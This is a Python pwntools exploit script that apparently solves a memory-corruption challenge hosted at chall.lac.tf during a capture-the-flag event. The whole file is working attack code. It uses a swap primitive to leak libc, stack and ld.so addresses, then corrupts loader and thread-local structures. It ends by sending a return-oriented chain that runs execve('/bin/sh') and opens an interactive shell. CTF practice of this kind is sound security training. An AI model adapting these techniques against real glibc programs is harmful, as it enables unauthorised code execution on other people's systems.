from pwn import *
from time import sleep

libc = ELF("./libc.so.6")
p = remote("chall.lac.tf", "31166")

def swap(a: int, b: int):
    log.info(f"swapping {a} and {b}")
    p.sendlineafter(b": ", f"{a}".encode())
    p.sendlineafter(b": ", f"{b}".encode())

def decode():
    leak = p.recv(8)
    return u64(bytes(reversed(leak)))

swap(0, 5)
swap(5, 12)
swap(0, 0)

libcbase = decode() - 0x24083
log.info(f"libcbase = {libcbase:#x}")

swap(5, 12)
swap(0, 32)
swap(0, 0)

stack = decode()
log.info(f"stack = {stack:#x}")
buf = stack - 0x1c8 - 0x20
log.info(f"buf = {buf:#x}")

swap(5, 12)
swap(0, 62)
swap(0, 0)

ld = decode() - 0x2d620
fs = ld - 0x2ac0
log.info(f"ld.so = {ld:#x}")
log.info(f"fs = {fs:#x}")

buf = stack - 0x2c8
log.info(f"buf = {buf:#x}")

laddr = 0x2f190
swap((fs + 0x308 - buf) // 8, (libcbase + 0x1ec240 - buf) // 8)
swap((ld + 0x2f010 - buf) // 8, (libcbase + 0x1f1490 - buf) // 8)
# set __libc_pthread_functions.ptr___pthread_unwind = __exit_funcs->fns[0].func.on.fn
swap((libcbase + 0x1f1470 - buf) // 8, (libcbase + 0x1edcb8 - buf) // 8)
swap((libcbase + 0x1ec768 - buf) // 8, (ld + laddr - buf) // 8)
# null DT_FINI
swap((libcbase + 0x1ec3a0 - buf) // 8, (ld + laddr + 0xa8 - buf) // 8)
# set fini array entry
swap((libcbase + 0x1effc8 - buf) // 8, 9)
swap((fs + 0x18 - buf) // 8, (ld + 0x2e978 - buf) // 8)

buf = stack - 0x3d8
log.info(f"buf = {buf:#x}")

# set l_init_called to non zero value (1)
swap((ld + 0x2ece4 - buf) // 8, (ld + laddr + 0x318 - buf) // 8)
# # change fs:0x308 from 0x1a to 0x0a
swap((-0x8a0) // 8, (fs + 0x308 - buf) // 8)
# return to __libc_write
swap(25, 5)
# edit __libc_write return address
swap(31, 11)
swap(0, 0)

buf = stack - 0x4b8
log.info(f"buf = {buf:#x}")

# return to __libc_read
swap(5, 25)
# read from fd 0
swap(7, (libcbase + 0x1ec388 - buf) // 8)
# write to main arena (libcbase + 0x1ecbe0)
swap(8, (libcbase + 0x1ecbf0 - buf) // 8)
# number of bytes (0x408)
swap(9, (libcbase + 0x1ec2d8 - buf) // 8)
# edit __libc_read return address to main
swap(11, 99)
swap(0, 0)

sleep(1)

poprdi = 0x0000000000023b6a
poprsi = 0x000000000002601f
poprdxr12 = 0x0000000000119431
shell = next(libc.search(b"/bin/sh\x00"))
execve = libc.sym.execve

chain =  p64(libcbase + poprdi)
chain += p64(libcbase + shell)
chain += p64(libcbase + poprsi)
chain += p64(0)
chain += p64(libcbase + poprdxr12)
chain += p64(0) * 2
chain += p64(libcbase + execve)

p.sendline(chain)

buf = stack - 0x480
log.info(f"buf = {buf:#x}")

for i in range(0, len(chain) // 8):
    swap(5 + i, (libcbase + 0x1ecbe0 + i * 8 - buf) // 8)

swap(0, 0)

p.interactive()